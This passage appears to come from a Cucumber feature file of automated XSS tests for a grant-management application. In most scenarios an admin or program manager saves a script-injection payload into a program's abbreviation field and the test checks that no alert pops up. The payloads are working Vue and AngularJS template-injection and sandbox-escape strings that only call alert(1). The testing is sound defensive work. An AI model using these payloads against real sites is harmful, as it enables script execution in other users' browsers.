    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | {{_createVNode.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301488 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                           | Field                |
      | <p v-show=_createBlock.constructor`alert(1)`()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301490 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <x @[_openBlock.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301491 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <x @[_capitalize.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301493 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <x @click=_withCtx.constructor`alert(1)`()>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301496 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <x @click=$event.view.alert(1)>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301502 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | {{_Vue.h.constructor`alert(1)`()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301504 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | {{$emit.constructor`alert(1)`()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301506 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                 | Field                |
      | <teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301510 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <component is=script text=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301513 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | {{constructor.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301514 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | {{$on.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301515 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                      | Field                |
      | {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301517 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | {{{}.")));alert(1)//"}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301531 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301534 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301539 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | {{{}.")));alert(1)//"}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301548 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                     | Field                |
      | {{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) && (apply = constructor) && (valueOf = call) &&  (''+''.toString('F = Function.prototype;' +'F.apply = F.a;' +'delete F.a;' +'delete F.valueOf;' +'alert(1);' )));}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301550 @Vrushali
